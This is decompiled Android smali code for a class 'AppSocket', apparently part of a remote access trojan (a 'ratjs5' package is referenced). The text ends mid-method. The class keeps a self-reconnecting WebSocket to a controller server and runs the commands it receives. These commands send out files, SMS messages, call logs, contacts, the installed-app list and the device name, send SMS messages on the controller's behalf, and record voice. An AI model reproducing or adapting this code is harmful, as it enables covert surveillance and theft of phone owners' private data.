.class public final Lthisisme/thisapp/inspector/Utils/AppSocket;
.super Lokhttp3/WebSocketListener;
.source "AppSocket.kt"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000X\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0008\n\u0000\n\u0002\u0010\u000e\n\u0002\u0008\u0003\n\u0002\u0010\u0003\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0005\u0008\u0007\u0018\u00002\u00020\u0001:\u0001#B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\u0006\u0010\u0011\u001a\u00020\u0012J \u0010\u0013\u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u0019H\u0016J \u0010\u001a\u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u0019H\u0016J\"\u0010\u001b\u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u001c\u001a\u00020\u001d2\u0008\u0010\u001e\u001a\u0004\u0018\u00010\u001fH\u0016J\u0018\u0010 \u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010!\u001a\u00020\u0019H\u0016J\u0018\u0010\"\u001a\u00020\u00122\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u001e\u001a\u00020\u001fH\u0016R\u0011\u0010\u0005\u001a\u00020\u0006\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0007\u0010\u0008R\u000e\u0010\t\u001a\u00020\nX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0011\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u000b\u0010\u000cR\u000e\u0010\r\u001a\u00020\u000eX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006$"
    }
    d2 = {
        "Lthisisme/thisapp/inspector/Utils/AppSocket;",
        "Lokhttp3/WebSocketListener;",
        "context",
        "Landroid/content/Context;",
        "(Landroid/content/Context;)V",
        "action",
        "Lthisisme/thisapp/inspector/Utils/AppActions;",
        "getAction",
        "()Lthisisme/thisapp/inspector/Utils/AppActions;",
        "client",
        "Lokhttp3/OkHttpClient;",
        "getContext",
        "()Landroid/content/Context;",
        "request",
        "Lokhttp3/Request;",
        "requests",
        "Lthisisme/thisapp/inspector/Utils/AppRequest;",
        "connect",
        "",
        "onClosed",
        "webSocket",
        "Lokhttp3/WebSocket;",
        "code",
        "",
        "reason",
        "",
        "onClosing",
        "onFailure",
        "t",
        "",
        "response",
        "Lokhttp3/Response;",
        "onMessage",
        "text",
        "onOpen",
        "SendSmsAction",
        "app_debug"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I


# instance fields
.field private final action:Lthisisme/thisapp/inspector/Utils/AppActions;

.field private final client:Lokhttp3/OkHttpClient;

.field private final context:Landroid/content/Context;

.field private final request:Lokhttp3/Request;

.field private final requests:Lthisisme/thisapp/inspector/Utils/AppRequest;


# direct methods
.method public static synthetic $r8$lambda$5Pt-vp4GLt3Q-tWgZC6hsCqYlyw(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 0

    invoke-static {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->onFailure$lambda-2(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    return-void
.end method

.method public static synthetic $r8$lambda$FxDUmhKdxbcLKG7PsPh221yrnGI(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 0

    invoke-static {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->connect$lambda-0(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    return-void
.end method

.method public static synthetic $r8$lambda$GMotpmt68vIoLa3QudZlHezJ4c4(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 0

    invoke-static {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->onClosing$lambda-3(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    return-void
.end method

.method public static synthetic $r8$lambda$nzeRaRaGRWMNTG64YDInM0lZezI(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 0

    invoke-static {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->onClosed$lambda-1(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 1

    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Int$class-AppSocket()I

    move-result v0

    sput v0, Lthisisme/thisapp/inspector/Utils/AppSocket;->$stable:I

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;

    const-string v0, "context"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 15
    invoke-direct {p0}, Lokhttp3/WebSocketListener;-><init>()V

    .line 14
    iput-object p1, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->context:Landroid/content/Context;

    .line 16
    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->client:Lokhttp3/OkHttpClient;

    .line 17
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-direct {v0, p1}, Lthisisme/thisapp/inspector/Utils/AppRequest;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->requests:Lthisisme/thisapp/inspector/Utils/AppRequest;

    .line 18
    new-instance v0, Lokhttp3/Request$Builder;

    invoke-direct {v0}, Lokhttp3/Request$Builder;-><init>()V

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1, p1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getAppData(Landroid/content/Context;)Lcom/myapps/ratjs5/Tools/AppTools$Companion$AppData;

    move-result-object v1

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion$AppData;->getSocket()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v0

    invoke-virtual {v0}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v0

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->request:Lokhttp3/Request;

    .line 19
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-direct {v0, p1}, Lthisisme/thisapp/inspector/Utils/AppActions;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    .line 14
    return-void
.end method

.method private static final connect$lambda-0(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 3
    .param p0, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppSocket;

    const-string v0, "this$0"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 23
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->requests:Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppRequest;->awake()V

    .line 24
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->client:Lokhttp3/OkHttpClient;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->request:Lokhttp3/Request;

    move-object v2, p0

    check-cast v2, Lokhttp3/WebSocketListener;

    invoke-virtual {v0, v1, v2}, Lokhttp3/OkHttpClient;->newWebSocket(Lokhttp3/Request;Lokhttp3/WebSocketListener;)Lokhttp3/WebSocket;

    .line 25
    return-void
.end method

.method private static final onClosed$lambda-1(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 1
    .param p0, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppSocket;

    const-string v0, "this$0"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 83
    invoke-virtual {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->connect()V

    .line 84
    return-void
.end method

.method private static final onClosing$lambda-3(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 1
    .param p0, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppSocket;

    const-string v0, "this$0"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 95
    invoke-virtual {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->connect()V

    .line 96
    return-void
.end method

.method private static final onFailure$lambda-2(Lthisisme/thisapp/inspector/Utils/AppSocket;)V
    .locals 1
    .param p0, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppSocket;

    const-string v0, "this$0"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 89
    invoke-virtual {p0}, Lthisisme/thisapp/inspector/Utils/AppSocket;->connect()V

    .line 90
    return-void
.end method


# virtual methods
.method public final connect()V
    .locals 2

    .line 22
    sget-object v0, Lthisisme/thisapp/inspector/Utils/AppScope;->Companion:Lthisisme/thisapp/inspector/Utils/AppScope$Companion;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda1;-><init>(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppScope$Companion;->runBack(Ljava/lang/Runnable;)V

    .line 26
    return-void
.end method

.method public final getAction()Lthisisme/thisapp/inspector/Utils/AppActions;
    .locals 1

    .line 19
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    return-object v0
.end method

.method public final getContext()Landroid/content/Context;
    .locals 1

    .line 14
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->context:Landroid/content/Context;

    return-object v0
.end method

.method public onClosed(Lokhttp3/WebSocket;ILjava/lang/String;)V
    .locals 4
    .param p1, "webSocket"    # Lokhttp3/WebSocket;
    .param p2, "code"    # I
    .param p3, "reason"    # Ljava/lang/String;

    const-string v0, "webSocket"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "reason"

    invoke-static {p3, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 82
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda3;

    invoke-direct {v1, p0}, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda3;-><init>(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    .line 84
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Long$arg-1$call-postDelayed$fun-onClosed$class-AppSocket()J

    move-result-wide v2

    .line 82
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 85
    return-void
.end method

.method public onClosing(Lokhttp3/WebSocket;ILjava/lang/String;)V
    .locals 4
    .param p1, "webSocket"    # Lokhttp3/WebSocket;
    .param p2, "code"    # I
    .param p3, "reason"    # Ljava/lang/String;

    const-string v0, "webSocket"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "reason"

    invoke-static {p3, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 94
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0}, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda2;-><init>(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    .line 96
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Long$arg-1$call-postDelayed$fun-onClosing$class-AppSocket()J

    move-result-wide v2

    .line 94
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 97
    return-void
.end method

.method public onFailure(Lokhttp3/WebSocket;Ljava/lang/Throwable;Lokhttp3/Response;)V
    .locals 4
    .param p1, "webSocket"    # Lokhttp3/WebSocket;
    .param p2, "t"    # Ljava/lang/Throwable;
    .param p3, "response"    # Lokhttp3/Response;

    const-string v0, "webSocket"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "t"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 88
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lthisisme/thisapp/inspector/Utils/AppSocket$$ExternalSyntheticLambda0;-><init>(Lthisisme/thisapp/inspector/Utils/AppSocket;)V

    .line 90
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Long$arg-1$call-postDelayed$fun-onFailure$class-AppSocket()J

    move-result-wide v2

    .line 88
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 91
    return-void
.end method

.method public onMessage(Lokhttp3/WebSocket;Ljava/lang/String;)V
    .locals 9
    .param p1, "webSocket"    # Lokhttp3/WebSocket;
    .param p2, "text"    # Ljava/lang/String;

    const-string v0, "webSocket"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "text"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 29
    move-object v0, p2

    check-cast v0, Ljava/lang/CharSequence;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-0$call-contains$cond$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v1

    check-cast v1, Ljava/lang/CharSequence;

    const/4 v2, 0x0

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v0, v1, v2, v3, v4}, Lkotlin/text/StringsKt;->contains$default(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZILjava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 30
    move-object v3, p2

    check-cast v3, Ljava/lang/CharSequence;

    const/4 v0, 0x1

    new-array v4, v0, [Ljava/lang/String;

    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$0$vararg$arg-0$call-split$val-text2$branch$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v4, v2

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x6

    const/4 v8, 0x0

    invoke-static/range {v3 .. v8}, Lkotlin/text/StringsKt;->split$default(Ljava/lang/CharSequence;[Ljava/lang/String;ZIILjava/lang/Object;)Ljava/util/List;

    move-result-object v0

    .line 31
    .local v0, "text2":Ljava/util/List;
    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Int$arg-0$call-get$val-actionRequest$branch$if$fun-onMessage$class-AppSocket()I

    move-result v1

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    .line 32
    .local v1, "actionRequest":Ljava/lang/String;
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Int$arg-0$call-get$val-path$branch$if$fun-onMessage$class-AppSocket()I

    move-result v2

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    .line 33
    .local v2, "path":Ljava/lang/String;
    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond$if$branch$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 34
    iget-object v3, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v3, v2}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendFile(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 35
    :cond_0
    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-1$if$branch$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c

    .line 36
    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->Int$arg-0$call-get$val-data$branch-1$if$branch$if$fun-onMessage$class-AppSocket()I

    move-result v3

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    .line 37
    .local v3, "data":Ljava/lang/String;
    new-instance v4, Lcom/google/gson/Gson;

    invoke-direct {v4}, Lcom/google/gson/Gson;-><init>()V

    const-class v5, Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;

    invoke-virtual {v4, v3, v5}, Lcom/google/gson/Gson;->fromJson(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;

    .line 38
    .local v4, "smsData":Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;
    iget-object v5, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    const-string v6, "smsData"

    invoke-static {v4, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendSms(Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;)V

    .end local v0    # "text2":Ljava/util/List;
    .end local v1    # "actionRequest":Ljava/lang/String;
    .end local v2    # "path":Ljava/lang/String;
    .end local v3    # "data":Ljava/lang/String;
    .end local v4    # "smsData":Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;
    goto/16 :goto_0

    .line 41
    :cond_1
    nop

    .line 42
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 43
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-0$call-send$branch$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Lokhttp3/WebSocket;->send(Ljava/lang/String;)Z

    goto/16 :goto_0

    .line 45
    :cond_2
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-1$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 46
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendCallLog()V

    goto/16 :goto_0

    .line 48
    :cond_3
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-2$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 49
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendAllSms()V

    goto/16 :goto_0

    .line 51
    :cond_4
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-3$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 52
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendApps()V

    goto/16 :goto_0

    .line 54
    :cond_5
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-4$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 55
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendDeviceName()V

    goto :goto_0

    .line 57
    :cond_6
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-5$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 58
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->sendContact()V

    goto :goto_0

    .line 60
    :cond_7
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->String$arg-1$call-EQEQ$cond-6$when$else$if$fun-onMessage$class-AppSocket()Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 61
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppSocket;->action:Lthisisme/thisapp/inspector/Utils/AppActions;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice1()V

    goto :goto_0

    .line 63
    :cond_8
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppSocketKt;

